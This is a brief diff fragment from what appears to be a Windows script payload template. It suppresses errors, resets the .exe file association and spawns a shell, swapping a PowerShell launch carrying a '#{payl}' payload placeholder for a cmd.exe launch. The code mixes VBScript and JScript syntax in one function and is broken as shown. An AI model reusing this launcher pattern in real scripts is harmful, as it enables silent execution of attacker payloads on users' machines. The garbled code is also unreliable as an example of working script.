@@ -21,7 +21,7 @@ On Error Resume Next
 set shell=createobject("Shell.Application")
 var objShell = new ActiveXObject("WScript.shell");
 objShell.run('"assoc.exe=exefile"')
-shell.ShellExecute "powershell.exe", "#{payl}", "", "open", 1
+objShell.run('"cmd.exe"')
 end function
  
  
